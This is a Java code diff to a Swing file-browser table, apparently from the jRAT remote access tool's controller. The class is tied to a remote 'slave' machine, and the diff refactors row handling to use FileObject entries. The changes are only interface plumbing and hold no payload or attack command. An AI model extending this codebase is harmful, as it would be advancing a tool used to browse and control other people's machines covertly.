@@ -17,6 +17,8 @@ import javax.swing.JTextField;
 import javax.swing.JToolBar;
 import javax.swing.table.DefaultTableModel;
 
+import se.jrat.client.AbstractSlave;
+import se.jrat.client.io.FileObject;
 import se.jrat.client.ui.renderers.JComboBoxIconRenderer;
 import se.jrat.client.ui.renderers.table.FileViewTableRenderer;
 import se.jrat.client.utils.IconUtils;
@@ -28,7 +30,7 @@ public abstract class FileTable extends JPanel {
 	protected JToolBar toolBar;
 	protected JTable table;
 	public FileViewTableRenderer tableRenderer;
-	public DefaultTableModel tableModel;
+	protected DefaultTableModel tableModel;
 	
 	protected JComboBox<String> driveComboBox;
 	protected DefaultComboBoxModel<String> driveComboModel;
@@ -37,13 +39,17 @@ public abstract class FileTable extends JPanel {
 	protected JTextField txtDir;
 	
 	public FileTable() {
+		this(null);
+	}
+	
+	public FileTable(AbstractSlave slave) {
 		setLayout(new BorderLayout(0, 0));
 		
 		toolBar = new JToolBar();
 		toolBar.setFloatable(false);
 		add(toolBar, BorderLayout.NORTH);
 		
-		tableRenderer = new FileViewTableRenderer(null);
+		tableRenderer = new FileViewTableRenderer(slave);
 		
 		tableModel = new DefaultTableModel(null, new Object[] { "File name", "File size", "Last modified", "Hidden" }) {
 			@Override
@@ -59,11 +65,10 @@ public abstract class FileTable extends JPanel {
 			@Override
 			public void mouseClicked(MouseEvent e) {
 				if (e.getClickCount() == 2 && table.getSelectedRow() != -1) {
-					String val = tableModel.getValueAt(table.getSelectedRow(), 0).toString();
-					String size = tableModel.getValueAt(table.getSelectedRow(), 1).toString();
-					if (size.length() == 0) {
+					FileObject fo = getSelectedFileObject();
+					if (fo.isDirectory()) {
 						clear();
-						onItemClick(val);
+						onItemClick(fo.getPath());
 					}
 				}
 			}
@@ -172,5 +177,15 @@ public abstract class FileTable extends JPanel {
 	
 	public void addPopup(JPopupMenu menu) {
 		Utils.addPopup(table, menu);
+	}
+	
+	public void addFileObject(FileObject fo) {
+		tableModel.addRow(new Object[] { fo });
+	}
+	
+	public FileObject getSelectedFileObject() {
+		int i = table.getSelectedRow();
+		
+		return (FileObject) table.getValueAt(i, 0);
 	}
 }
